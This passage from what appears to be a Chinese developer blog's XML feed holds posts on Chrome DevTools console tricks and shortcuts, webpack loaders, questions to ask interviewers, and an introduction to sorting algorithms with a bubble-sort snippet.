values, such as undefined.</p><blockquote><p>_.isNaN(NaN);<br>&#x3D;&gt; true<br>isNaN(undefined);<br>&#x3D;&gt; true<br>_.isNaN(undefined);<br>&#x3D;&gt; false</p></blockquote><p><strong>isNull</strong><code>_.isNull(object) </code><br>Returns true if the value of object is null.</p><blockquote><p>_.isNull(null);<br>&#x3D;&gt; true<br>_.isNull(undefined);<br>&#x3D;&gt; false</p></blockquote><p><strong>isUndefined</strong><code>_.isUndefined(value) </code><br>Returns true if value is undefined.</p><blockquote><p>_.isUndefined(window.missingVariable);<br>&#x3D;&gt; true</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05丨console 中的 &#39;$&#39;</title>
      <link href="/Blog/2019/03/14/chrome_debug/05%E4%B8%A8console%E4%B8%AD%E7%9A%84$/index/"/>
      <url>/Blog/2019/03/14/chrome_debug/05%E4%B8%A8console%E4%B8%AD%E7%9A%84$/index/</url>
      
        <content type="html"><![CDATA[<h3 id="1-0"><a href="#1-0" class="headerlink" title="1. $0"></a>1. <code>$0</code></h3><p>在 <code>Chrome</code> 的 <code>Elements</code> 面板中， <code>$0</code> 是对我们当前选中的 <code>html</code> 节点的引用。</p><p>理所当然，<code>$1</code> 是对上一次我们选择的节点的引用，<code>$2</code> 是对在那之前选择的节点的引用，等等。一直到 <code>$4</code></p><p>你可以尝试一些相关操作(例如: <code>$1.appendChild($0)</code>)</p><p><img src="/Blog/2019/03/14/chrome_debug/05%E4%B8%A8console%E4%B8%AD%E7%9A%84$/index/img.gif"></p><h3 id="2-和"><a href="#2-和" class="headerlink" title="2. $ 和 $$"></a>2. <code>$</code> 和 <code>$$</code></h3><p>如果你没有在 <code>App</code> 中定义过 <code>$</code> 变量 (例如 <code>jQuery</code> )的话，它在 <code>console</code> 中就是对这一大串函数 <code>document.querySelector</code> 的别名。</p><p>如果是 <code>$$</code> 就更加厉害了，还能节省更多的时间，因为它不仅执行 <code>document.QuerySelectorAll</code> 并且它返回的是：一个节点的 <strong>数组</strong> ，而不是一个 <code>Node list</code></p><p>本质上来说 <code>Array.from(document.querySelectorAll(&#39;div&#39;)) === $$(&#39;div&#39;)</code> ，但是<code>document.querySelectorAll(&#39;div&#39;)</code> 和 <code>$$(&#39;div&#39;)</code> 哪一种方式更加优雅呢？</p><h3 id="3"><a href="#3" class="headerlink" title="3. $_"></a>3. <code>$_</code></h3><p>调试的过程中，你经常会通过打印查看一些变量的值，但如果你想看一下上次执行的结果呢？再输一遍表达式吗？</p><p>这时候 <code>$_</code> 就派上了用场，<code>$_</code> 是对上次执行的结果的 <strong>引用</strong> ：</p><p><img src="/Blog/2019/03/14/chrome_debug/05%E4%B8%A8console%E4%B8%AD%E7%9A%84$/index/img.png"></p><h3 id="4-i"><a href="#4-i" class="headerlink" title="4. $i"></a>4. <code>$i</code></h3><p>现在的前端开发过程，离不开各种 <code>npm</code> 插件，但你可能没有想过，有一天我们竟然可以在 <code>Dev Tools</code> 里面来使用 <code>npm</code> 插件！</p><p>有时你只是想玩玩新出的 <code>npm</code> 包，现在不用再大费周章去建一个项目测试了，只需要在 <a href="https://chrome.google.com/webstore/detail/console-importer/hgajpakhafplebkdljleajgbpdmplhie/related">Chrome插件:Console Importer</a> 的帮助之下，快速的在 <code>console</code> 中引入和测试一些 <code>npm</code> 库。</p><p>运行 <code>$i(&#39;lodash&#39;)</code> 或者 <code>$i(&#39;moment&#39;)</code> 几秒钟后，你就可以获取到 <code>lodash / momentjs</code> 了:</p><p><img src="/Blog/2019/03/14/chrome_debug/05%E4%B8%A8console%E4%B8%AD%E7%9A%84$/index/img_1.gif"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>console.log 的 &quot;bug&quot; ?</title>
      <link href="/Blog/2019/03/14/chrome_debug/console.log%E7%9A%84bug/index/"/>
      <url>/Blog/2019/03/14/chrome_debug/console.log%E7%9A%84bug/index/</url>
      
        <content type="html"><![CDATA[<p>一般来说，我们会使用 <code>console.log()</code> 来打印某个对象，并且，两次打印之间，还会对这个对象进行修改，最后我们查看打印的结果发现，修改前的打印和修改后的打印，竟然是一样的？这样出乎意料的情况，让我们难以继续 <code>console.log</code> 的调试。</p><p>口说无凭，举个例子把：</p><p><img src="/Blog/2019/03/14/chrome_debug/console.log%E7%9A%84bug/index/img.gif"></p><p>我们可以看到，一共有两次打印，一次是打印原始信息，一次是打印我们修改后的信息，并且我们把属性 <code>a</code> 从 <code>0</code> 改成 <code>1</code> ，<code>name</code> 属性从 <code>Tomek</code> 改成 <code>Not Tomek</code></p><p>但打印的时候，两次都是我们修改之后的值？</p><p>那，为什么会出现这一现象？</p><p>说明：</p><blockquote><p><code>console</code> 中打印出的对象，在你打印出他内容之前，是以引用的方式保存的。</p></blockquote><p>知道了原因，对应的就知道该怎么处理这样的情况了：</p><ul><li>打印一个从这个对象复制出来的对象。</li><li>使用资源面中的断点来调试</li><li>使用 <code>JSON.stringify()</code> 方法处理打印的结果</li><li>更多你可以想到的好方法~</li></ul>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04丨使用 Command</title>
      <link href="/Blog/2019/03/13/chrome_debug/04%E4%B8%A8%E4%BD%BF%E7%94%A8%20Command/index/"/>
      <url>/Blog/2019/03/13/chrome_debug/04%E4%B8%A8%E4%BD%BF%E7%94%A8%20Command/index/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们直接可以直接看到的 <code>DevTools</code> 的功能，其实只是有限的一部分，怎么去探索更多的功能呢？</p><p><code>Command</code> 菜单可以帮助我们快速找到那些被隐藏起来的功能，这也是它本身必不可少的原因。</p><p>如果你使用过 <code>WebStorm</code> 中的 <code>Find Action</code> (查找动作) 或者 <code>Visual Studio Code</code> 中的 <code>Command Palette</code> 的话，那么在 <code>DevTools</code> 中的 <code>Command</code> 菜单也与之类似：</p><ul><li>在 <code>Chrome</code> 的调试打开的情况下 按下 [ <code>Ctrl]</code> + <code>[Shift]</code> + <code>[P]</code> (Mac： <code>[⌘]</code> + <code>[Shift]</code>+ <code>[P]</code> )</li><li>或者使用 <code>DevTools</code> 的 <code>dropdown</code> 按钮下的这个选项:</li></ul><p><img src="/Blog/2019/03/13/chrome_debug/04%E4%B8%A8%E4%BD%BF%E7%94%A8%20Command/index/img.png"></p><p>下图中，我整理了可供选择的命令列表，归为几个部分：</p><p><img src="/Blog/2019/03/13/chrome_debug/04%E4%B8%A8%E4%BD%BF%E7%94%A8%20Command/index/img_1.png"></p><blockquote><p>上面这张图同时也证明了 <code>DevTools</code> 有多么强力!</p></blockquote><h3 id="1-截屏的新姿势"><a href="#1-截屏的新姿势" class="headerlink" title="1.截屏的新姿势"></a>1.截屏的新姿势</h3><p>当你只想对一个特别的 <code>DOM</code> 节点进行截图时，你可能需要使用其他工具弄半天，但现在你直接选中那个节点，打开 <code>Command</code> 菜单并且使用 <strong>节点截图</strong> 的就可以了。</p><p>不只是这样，你同样可以用这种方式 <strong>全屏截图</strong> - 通过 <code>Capture full size screenshot</code> 命令。请注意，这里说的是全屏，并不是嵌入页面的一部分。一般来说这可是得使用浏览器插件才能做到的事情！</p><p><img src="/Blog/2019/03/13/chrome_debug/04%E4%B8%A8%E4%BD%BF%E7%94%A8%20Command/index/img.gif"></p><blockquote><p>注：**<code>节点截图有时会失效</code>**，全屏截图暂时没有遇到问题，建议大家使用后者。</p></blockquote><h3 id="2-快速切换面板"><a href="#2-快速切换面板" class="headerlink" title="2.快速切换面板"></a>2.快速切换面板</h3><p><code>DevTools</code> 使用双面板布局，形式一般是：<code>元素面板</code> + <code>资源面板</code> ，它根据屏幕可用的部分，经常将不同面板横向或者纵向的排列，以适合阅读的方式展示出来。但有时候我们并不喜欢默认的布局。</p><p>你是否想过要重置 <code>DevTools</code> 呢？将 <code>样式面板</code> 从 <code>html预览</code> 的底部移动到右边或者周围其他的位置呢？是的，这就是下面要介绍的 😉</p><p>打开 <code>Commands</code> 菜单并且输入 <code>layout</code> ，你会看到 <code>2</code> 到 <code>3</code> 个可供选择的项(这里不再显示你已经激活的选项)：</p><ul><li>使用横向面板布局</li><li>使用纵向面板布局</li><li>使用自动面板布局</li></ul><p>试试看：</p><p><img src="/Blog/2019/03/13/chrome_debug/04%E4%B8%A8%E4%BD%BF%E7%94%A8%20Command/index/img_1.gif"></p><h2 id="3-快速切换主题"><a href="#3-快速切换主题" class="headerlink" title="3.快速切换主题"></a>3.快速切换主题</h2><p>经常在电脑前一坐就是一天，所以我不能忍受一直看着白闪闪的屏幕。而且突然出现的强光也让人讨厌：我们一直都在黑暗的空间中工作，突然太阳出来了，照在你的 <code>DevTools</code> 上，导致你什么都看不到！</p><p>这个时候 <code>主题</code> 就派上了用场了：在 <code>Commands</code> 菜单中寻找与 <code>theme</code> 相关的选项，实现 <code>明亮</code> &amp; <code>暗黑</code> 两种主题之间的切换：</p><p><img src="/Blog/2019/03/13/chrome_debug/04%E4%B8%A8%E4%BD%BF%E7%94%A8%20Command/index/img_2.gif"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03丨快捷键和通用技巧</title>
      <link href="/Blog/2019/03/13/chrome_debug/03%E4%B8%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%92%8C%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2019/03/13/chrome_debug/03%E4%B8%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%92%8C%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<h3 id="1-切换-DevTools-窗口的展示布局"><a href="#1-切换-DevTools-窗口的展示布局" class="headerlink" title="1. 切换 DevTools 窗口的展示布局"></a>1. 切换 DevTools 窗口的展示布局</h3><p>一般我在使用 <code>DevTools</code> 时， <code>dock</code> 的展示窗口都在底部 ，但是有时候我想把 <code>dock</code> 的窗口 切换到右边。</p><p>怎么做呢？</p><p>这时就可以通过 <code>DevTools</code> 的下拉菜单，或者命令菜单…或者使用一个快捷键 <code>ctrl + shift + D</code> (<code>⌘ + shift + D</code> Mac) 来实现位置的切换（通常是从 <strong>开始的位置</strong> 到 <strong>右边位置</strong>， 但是如果一开始就是 <strong>右边的位置</strong> 那么会切换到 <strong>左边的位置</strong>）:</p><p><img src="/Blog/2019/03/13/chrome_debug/03%E4%B8%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%92%8C%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7/index/img.png"></p><h3 id="2-切换-DevTools-的面板"><a href="#2-切换-DevTools-的面板" class="headerlink" title="2. 切换 DevTools 的面板"></a>2. 切换 DevTools 的面板</h3><p>如果可以的话，我想成为一个不需要鼠标的开发者，日常开发中，我们常需要从 <strong>元素面板</strong> 跳转到 <strong>资源面板</strong> 并返回，这样往返的来调试我们的代码，怎么来节省鼠标点击的时间呢：</p><ul><li><p>按下 <code>ctrl + [</code> 和 <code>ctrl + ]</code> 可以从当前面板的分别向左和向右切换面板。</p></li><li><p>按下 <code>ctrl + 1</code> 到 <code>ctrl + 9</code> 可以直接转到编号 <code>1...9</code> 的面板(<code>ctrl + 1</code> 转到元素面板，<code>ctrl + 4</code> 转到网络信息面板等等)</p></li></ul><p><strong>请注意!</strong> 我们在上面介绍的第二组快捷键默认被禁用了。你可以通过  <code>DevTools</code>&gt;&gt;<code>Settings</code>&gt;&gt;<code>Preferences</code>&gt;&gt;<code>Appearance</code> 打开这个选项：</p><p><img src="/Blog/2019/03/13/chrome_debug/03%E4%B8%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%92%8C%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7/index/img_1.png"></p><h3 id="3-递增-x2F-递减"><a href="#3-递增-x2F-递减" class="headerlink" title="3. 递增&#x2F;递减"></a>3. 递增&#x2F;递减</h3><p>接下来这个技巧，对调整样式是最有用的：通过使用 <code>带有</code> 或者 <code>不带有修饰键</code> 的 <code>上 / 下</code> 箭头按键 你可以实现 <strong>递增</strong> 和 <strong>递减</strong>  <code>0.1</code> ， <code>1</code> 或者 <code>10</code> 这样数值类型的值。</p><p><img src="/Blog/2019/03/13/chrome_debug/03%E4%B8%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%92%8C%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7/index/img_2.png"></p><h3 id="4-elements，-logs，-sources-amp-network-中的查找"><a href="#4-elements，-logs，-sources-amp-network-中的查找" class="headerlink" title="4. elements， logs， sources &amp; network 中的查找"></a>4. elements， logs， sources &amp; network 中的查找</h3><p><code>DevTools</code> 中的前4个主要的面板，每一个都支持 <code>[ctrl] + [f]</code> 快捷方式，你可以使用对应的查询方式来查找信息:</p><ul><li>在 <code>Elements</code> 面板中 - 通过 <code>string</code> ，选择器 或者 <code>XPath</code> 来查找</li><li>而在 <code>Console</code>， <code>Network</code> 以及 <code>Source</code> 面板 - 通过区分大小写，或者可以被视为表达式的 <code>strings</code>， 来查找</li></ul><p><img src="/Blog/2019/03/13/chrome_debug/03%E4%B8%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%92%8C%E9%80%9A%E7%94%A8%E6%8A%80%E5%B7%A7/index/img_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02丨copying &amp; saving</title>
      <link href="/Blog/2019/03/12/chrome_debug/02%E4%B8%A8copying%EF%BC%86saving/index/index/"/>
      <url>/Blog/2019/03/12/chrome_debug/02%E4%B8%A8copying%EF%BC%86saving/index/index/</url>
      
        <content type="html"><![CDATA[<p>在调试的过程中，我们总要对 <code>Dev Tools</code> 里面的数据进行 <strong>复制</strong> 或者 <strong>保存</strong> 的操作，所以我们来看看，关于这些，有什么小技巧呢？</p><h3 id="1-copy"><a href="#1-copy" class="headerlink" title="1. copy(...)"></a>1. <code>copy(...)</code></h3><p>你可以通过全局的方法 <code>copy()</code> 在 <code>console</code> 里 <code>copy</code> 任何你能拿到的资源。</p><p><img src="/Blog/img.png"></p><h3 id="2-Store-as-global-存储为一个全局变量"><a href="#2-Store-as-global-存储为一个全局变量" class="headerlink" title="2. Store as global (存储为一个全局变量)"></a>2. <code>Store as global</code> (存储为一个全局变量)</h3><p>如果你在 <code>console</code> 中打印了一堆数据 (例如你在 <code>App</code> 中计算出来的一个数组) ，然后你想对这些数据做一些额外的操作比如我们刚刚说的 <code>copy</code> (在不影响它原来值的情况下) 。 那就可以将它转换成一个全局变量，只需要 <strong>右击</strong> 它，并选择 <code>“Store as global variable”</code> (保存为全局变量) 选项。</p><p>第一次使用的话，它会创建一个名为 <code>temp1</code> 的变量，第二次创建 <code>temp2</code>，第三次 … 。通过使用这些变量来操作对应的数据，不用再担心影响到他们原来的值:</p><p><img src="/Blog/img_1.png"></p><h3 id="3-保存堆栈信息-Stack-trace"><a href="#3-保存堆栈信息-Stack-trace" class="headerlink" title="3.保存堆栈信息( Stack trace )"></a>3.保存堆栈信息( <code>Stack trace</code> )</h3><p>大多数情况下都不是一个人开发一个项目，而是一个团队协作，那么 <strong>如何准确的描述问题，就成为了沟通的关键</strong> ，这时候 <code>console</code> 打印出来的堆栈跟踪的信息对你和同事来说就起大作用了，可以省去很多沟通成本，所以你可以直接把堆栈跟踪的信息保存为一个文件，而不只是截图发给对方：</p><p><img src="/Blog/img_2.png"></p><h3 id="4-直接Copy-HTML"><a href="#4-直接Copy-HTML" class="headerlink" title="4.直接Copy HTML"></a>4.直接Copy HTML</h3><p>几乎所有人都知道，右击或者点击在 <code>HTML</code> 元素边上的省略号 (…) 就可以将它 <code>copy</code> 到剪贴板中，但是你不知道的是：古老的<code>[ctrl] + [c]</code>大法依旧可用！</p><p><img src="/Blog/img_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01丨history</title>
      <link href="/Blog/2019/03/11/chrome_debug/01%E4%B8%A8history/index/"/>
      <url>/Blog/2019/03/11/chrome_debug/01%E4%B8%A8history/index/</url>
      
        <content type="html"><![CDATA[<p>谷歌浏览器（通常简称为 <code>Chrome</code> ）是由谷歌开发的网络浏览器。 它于 2008 年首次针对 <code>Microsoft Windows</code> 发布，后来移植到 <code>Linux</code> ，<code>macOS</code> ，<code>iOS</code> 和 <code>Android</code> 。 浏览器也是 <code>Chrome OS</code> 的主要组件，它可以作为 <code>Web</code> 应用的平台。<a href="https://link.juejin.im/?target=https://en.wikipedia.org/wiki/Google_Chrome">Chrome-wikipedia</a></p><p>浏览器的市场天下三分，<code>Chorme</code>，<code>Safari</code>和<code>FireFox</code>，从 2008 年 <code>Chrome</code> 横空出世以来，如今已经一家独大占据了半壁江山：</p><p><img src="/Blog/img.png"></p><p><strong>一起来看看这款强大的浏览器的一些调教技巧吧~</strong></p><p>共以下 8 个面板：</p><ul><li><p><strong>元素面板(Element)</strong><br>使用控制台面板<br>命令行交互</p></li><li><p><strong>控制台面板(Console)</strong><br>使用控制台面板<br>命令行交互</p></li><li><p><strong>源代码面板(Sources)</strong><br>断点调试<br>调试混淆的代码<br>使用开发者工具的 Workspaces（工作区）进行持久化保存</p></li><li><p><strong>网络面板(Network)</strong><br>网络面板基础<br>了解资源时间轴<br>网络带宽限制</p></li><li><p><strong>性能面板(Performance)</strong><br>使用时间轴面板可以通过记录和查看网站生命周期内发生的各种事件来提高页面的运行时性能</p></li><li><p><strong>内存面板(Memory)</strong><br>JavaScript CPU 分析器<br>内存堆区分析器</p></li><li><p><strong>应用面板(Application)</strong><br>管理数据</p></li><li><p><strong>安全面板(Security)</strong><br>安全</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack 的 loader 是什么</title>
      <link href="/Blog/2019/03/07/interview/webpack%E7%9A%84loader%E6%98%AF%E4%BB%80%E4%B9%88/index/"/>
      <url>/Blog/2019/03/07/interview/webpack%E7%9A%84loader%E6%98%AF%E4%BB%80%E4%B9%88/index/</url>
      
        <content type="html"><![CDATA[<ul><li>webpack 自带的打包器只能支持 JS 文件</li><li>当我们想要加载 css&#x2F;less&#x2F;scss&#x2F;stylus&#x2F;ts&#x2F;md 文件时，就需要用 loader</li><li>loader 的原理就是把文件内容包装成能运行的 JS</li><li>比如</li><li>加载 css 需要用到 style-loader 和 css-loader（由于单一职责的原则，一个loader只做一件事情）</li><li>style-loader 把代码挂载到 head 里的 style 标签里</li><li>这里可以深入讲一下 style-loader 用到了 pitch 钩子和 request 对象</li><li><strong>大公司</strong></li><li>我写过一个简单的 loader 放在 github 上面，你可以看一下</li><li>如果面试官问原理，就把代码大概思路说一遍</li><li>然后说说我的loader 和 webpack 推荐的 loader 区别在哪里</li><li>一般都是说缺点，我的 loade 不支持这里，不支持那里，但是由于足够支持我的项目了，所以没有更加深入了</li></ul>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反向面试</title>
      <link href="/Blog/2019/03/07/interview/%E5%8F%8D%E5%90%91%E9%9D%A2%E8%AF%95/index/"/>
      <url>/Blog/2019/03/07/interview/%E5%8F%8D%E5%90%91%E9%9D%A2%E8%AF%95/index/</url>
      
        <content type="html"><![CDATA[<h2 id="预期使用方式"><a href="#预期使用方式" class="headerlink" title="预期使用方式"></a>预期使用方式</h2><ul><li>检查一下哪些问题你感兴趣</li><li>检查一下哪些是你可以自己在网上找到答案的</li><li>找不到的话就向面试官提问</li></ul><p>绝对不要想把这个列表里的每个问题都问一遍。</p><p>请记住事情总是灵活的，组织的结构调整也会经常发生。 拥有一个 bug 追踪系统并不会保证高效处理 bug。CI&#x2F;CD (持续集成系统) 也不一定保证交付时间会很短。</p><h1 id="职责"><a href="#职责" class="headerlink" title="职责"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E8%81%8C%E8%B4%A3"></a>职责</h1><ul><li>On-call (电话值班)的计划或者规定是什么？值班或者遇到问题加班时候有加班费吗？</li><li>我的日常工作是什么？</li><li>团队里面初级和高级工程师的比例是多少？（有计划改变吗）</li><li>入职培训会是什么样的？</li><li>自己单独的开发活动和按部就班工作的比例大概是怎样的？</li><li>每天预期&#x2F;核心工作时间是多少小时？</li><li>在你看来，这个工作做到什么程度算成功？</li><li>我入职的岗位是新增还是接替之前离职的同事？(是否有技术债需要还)？(zh)</li><li>入职之后在哪个项目组，项目是新成立还是已有的？(zh)</li></ul><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E6%8A%80%E6%9C%AF"></a>技术</h1><ul><li>公司常用的技术栈是什么?</li><li>你们怎么使用源码控制系统？</li><li>你们怎么测试代码？</li><li>你们怎么追踪 bug?</li><li>你们怎么集成和部署代码改动？是使用持续集成和持续部署吗？</li><li>你们的基础设施搭建方法在版本管理系统里吗？或者是代码化的吗？</li><li>从计划到完成一项任务的工作流是什么样的？</li><li>你们如何准备故障恢复？</li><li>有标准的开发环境吗？是强制的吗？</li><li>你们需要花费多长时间来给产品搭建一个本地测试环境？（分钟&#x2F;小时&#x2F;天）</li><li>你们需要花费多长时间来响应代码或者依赖中的安全问题？</li><li>所有的开发者都可以使用他们电脑的本地管理员权限吗？</li><li>公司是否有技术分享交流活动？有的话，多久一次呢？(zh)</li><li>你们的数据库是怎么进行版本控制的？(zh)</li><li>业务需求有没有文档记录？是如何记录的？(zh)</li></ul><h1 id="团队"><a href="#团队" class="headerlink" title="团队"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E5%9B%A2%E9%98%9F"></a>团队</h1><ul><li>工作是怎么组织的？</li><li>团队内&#x2F;团队间的交流通常是怎样的？</li><li>如果遇到不同的意见怎样处理？</li><li>谁来设定优先级 &#x2F; 计划？</li><li>如果被退回了会怎样？（“这个在预计的时间内做不完”）</li><li>每周都会开什么类型的会议？</li><li>产品&#x2F;服务的规划是什么样的？（n周一发布 &#x2F; 持续部署 &#x2F; 多个发布流 &#x2F; …)</li><li>生产环境发生事故了怎么办？是否有不批评人而分析问题的文化？</li><li>有没有一些团队正在经历还尚待解决的挑战？</li><li>公司技术团队的架构和人员组成？(zh)</li></ul><h1 id="公司"><a href="#公司" class="headerlink" title="公司"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E5%85%AC%E5%8F%B8"></a>公司</h1><ul><li>有没有会议&#x2F;旅行预算？使用的规定是什么？</li><li>晋升流程是怎样的？要求&#x2F;预期是怎样沟通的？</li><li>技术和管理两条职业路径是分开的吗？</li><li>对于多元化招聘的现状或者观点是什么？</li><li>有公司级别的学习资源吗？比如电子书订阅或者在线课程？</li><li>有获取证书的预算吗？</li><li>公司的成熟度如何？（早期寻找方向 &#x2F; 有内容的工作 &#x2F; 维护中 &#x2F; …)</li><li>我可以为开源项目做贡献吗？是否需要审批？</li><li>有竞业限制或者保密协议需要签吗？</li><li>你们认为公司文化中的空白是什么？</li><li>能够跟我说一公司处于不良情况，以及如何处理的故事吗？</li></ul><h1 id="商业"><a href="#商业" class="headerlink" title="商业"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E5%95%86%E4%B8%9A"></a>商业</h1><ul><li>你们现在盈利吗？</li><li>如果没有的话，还需要多久？</li><li>公司的资金来源是什么？谁影响或者指定高层计划或方向？</li><li>你们如何挣钱？</li><li>什么阻止了你们挣更多的钱？</li><li>你们认为什么是你们的竞争优势？</li></ul><h1 id="远程工作"><a href="#远程工作" class="headerlink" title="远程工作"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E8%BF%9C%E7%A8%8B%E5%B7%A5%E4%BD%9C"></a>远程工作</h1><ul><li>远程工作和办公室工作的比例是多少？</li><li>公司提供硬件吗？更新计划如何？</li><li>额外的附件和家居可以通过公司购买吗？这方面是否有预算？</li><li>有共享办公或者上网的预算吗？</li><li>多久需要去一次办公室？</li><li>公司的会议室是否一直为视频会议准备着？</li></ul><h1 id="办公室工作"><a href="#办公室工作" class="headerlink" title="办公室工作"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E5%8A%9E%E5%85%AC%E5%AE%A4%E5%B7%A5%E4%BD%9C"></a>办公室工作</h1><ul><li>办公室的布局如何？（开放的 &#x2F; 小隔间 &#x2F; 独立办公室）</li><li>有没有支持&#x2F;市场&#x2F;或者其他需要大量打电话的团队在我的团队旁边办公？</li></ul><h1 id="待遇"><a href="#待遇" class="headerlink" title="待遇"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E5%BE%85%E9%81%87"></a>待遇</h1><ul><li>如果有奖金计划的话，奖金如何分配？</li><li>如果有奖金计划的话，过去的几年里通常会发百分之多少的奖金？</li><li>有五险一金或者其他退休养老金等福利吗？如果有的话，公司有配套的商业保险吗？</li></ul><h1 id="带薪休假"><a href="#带薪休假" class="headerlink" title="带薪休假"></a><a href="https://github.com/yifeikong/reverse-interview-zh#%E5%B8%A6%E8%96%AA%E4%BC%91%E5%81%87"></a>带薪休假</h1><ul><li>带薪休假时间有多久？</li><li>病假和事假是分开的还是一起算？</li><li>我可以提前使用假期时间吗？也就是说应休假期是负的？</li><li>假期的更新策略是什么样的？也就是说未休的假期能否滚入下一周期</li><li>照顾小孩的政策如何？</li><li>无薪休假政策是什么样的？</li></ul>]]></content>
      
      
      <categories>
          
          <category> 准备面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法与数据结构</title>
      <link href="/Blog/2019/03/07/interview/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/index/"/>
      <url>/Blog/2019/03/07/interview/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/index/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是算法"><a href="#什么是算法" class="headerlink" title="什么是算法"></a>什么是算法</h2><p><a href="https://zh.wikipedia.org/zh-hans/%E7%AE%97%E6%B3%95" title="null">算法</a></p><p>以下是高德纳在他的著作《计算机程序设计艺术》里对算法的特征归纳：</p><ul><li><strong>输入</strong>：一个算法必须有零个或以上输入量。</li><li><strong>输出</strong>：一个算法应有一个或以上输出量，输出量是算法计算的结果。</li><li><strong>明确性</strong>：算法的描述必须无歧义，以保证算法的实际执行结果是精确地匹配要求或期望，通常要求实际运行结果是确定的。</li><li><strong>有限性</strong>：依据图灵的定义，一个算法是能够被任何图灵完备系统模拟的一串运算，而图灵机只有有限个状态、有限个输入符号和有限个转移函数（指令）。而一些定义更规定算法必须在有限个步骤内完成任务。</li><li><strong>有效性</strong>：又称可行性。能够实现，算法中描述的操作都是可以通过已经实现的基本运算执行有限次来实现。</li></ul><h2 id="什么是数据结构"><a href="#什么是数据结构" class="headerlink" title="什么是数据结构"></a>什么是数据结构</h2><p>就是数据的结构。</p><p>一般来说是这样的：</p><ol><li>我们要解决一个跟数据相关的问题</li><li>分析这个问题，想出对应的数据结构</li><li>分析数据结构，想出算法</li><li>数据结构和算法是互相依存、不可分开的</li><li>你学习完排序算法，就能了解常见的数据结构</li></ol><h3 id="大分类"><a href="#大分类" class="headerlink" title="大分类"></a>大分类</h3><ul><li>分治法：把一个问题分区成互相独立的多个部分分别求解的思路。这种求解思路带来的好处之一是便于进行并行计算。</li><li>动态规划法：当问题的整体最优解就是由局部最优解组成的时候，经常采用的一种方法。</li><li>贪婪算法：常见的近似求解思路。当问题的整体最优解不是（或无法证明是）由局部最优解组成，且对解的最优性没有要求的时候，可以采用的一种方法。</li><li>线性规划法：见词条。</li><li>简并法：把一个问题通过逻辑或数学推理，简化成与之等价或者近似的、相对简单的模型，进而求解的方法。<br>我们前端主要使用分治法——分而治之。</li></ul><h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><p>中国学生学不好排序算法主要是因为这些算法的名字是外国人取的</p><ol><li>体育委员两两摸头法（冒泡排序）</li><li>体育老师一指禅法（选择排序）</li><li>起扑克牌法（插入排序）</li><li>强迫症收扑克牌法（计数排序，直播的时候说成了『基数排序』，抱歉）</li><li>快排</li><li>归并排序</li><li>堆排序</li></ol><p>排序可视化：<a href="https://visualgo.net/bn/sorting" title="null">https://visualgo.net/bn/sorting</a></p><h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const arr = <span class="comment">[234,5,6,7,23,34,5432,6,76,23,432,342,6,234,234]</span></span><br><span class="line">for (let i=0;i&lt;arr.length-1;i++) &#123;</span><br><span class="line">  if (arr<span class="comment">[i]</span> &gt; arr<span class="comment">[i+1]</span>) &#123;</span><br><span class="line">    <span class="comment">[arr<span class="comment">[i]</span>, arr<span class="comment">[i+1]</span>]</span> = <span class="comment">[arr<span class="comment">[i+1]</span>, arr<span class="comment">[i]</span>]</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(arr)</span><br></pre></td></tr></table></figure><blockquote><p>将每一项与后一项对比，一轮即可找出最大的一项并放到最后。</p></blockquote><figure class="highlight 